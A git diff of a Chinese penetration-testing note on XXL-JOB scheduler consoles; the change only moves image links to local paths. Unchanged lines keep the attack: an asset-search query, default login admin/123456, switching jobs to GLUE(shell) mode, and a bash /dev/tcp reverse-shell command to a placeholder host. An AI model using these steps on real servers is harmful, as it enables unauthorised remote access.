@@ -22,21 +22,21 @@ app="XXL-JOB" || title="任务调度中心"
 
 - 默认口令 admin/123456
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101914314.png)
+![](./images/202202101914314.png)
 
 - 注意运行模式需要为 GLUE(shell)
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101915543.png)
+![](./images/202202101915543.png)
 
 点击 GLUE IDE编辑脚本
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101915236.png)
+![](./images/202202101915236.png)
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101915343.png)
+![](./images/202202101915343.png)
 
 
 
@@ -55,4 +55,4 @@ bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1'
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101915912.png)
+![](./images/202202101915912.png)
